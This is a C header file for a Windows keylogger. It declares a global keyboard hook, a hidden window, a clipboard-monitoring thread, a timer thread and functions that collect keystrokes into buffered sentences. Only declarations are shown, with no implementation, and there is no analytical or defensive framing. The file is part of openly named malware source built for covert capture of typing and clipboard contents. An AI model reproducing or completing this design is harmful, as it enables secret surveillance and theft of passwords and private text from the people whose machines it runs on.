#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include "config.h"

extern HHOOK g_keyboardHook;
extern HWND g_hiddenWnd;

void FlushSentence();
void AddChar(char c);
void AddSpecialKey(const char* keyName);

DWORD WINAPI TimerThread(LPVOID lpParam);
DWORD WINAPI ClipboardThread(LPVOID lpParam);

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
LRESULT CALLBACK ClipboardWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);

#endif // KEYLOGGER_H
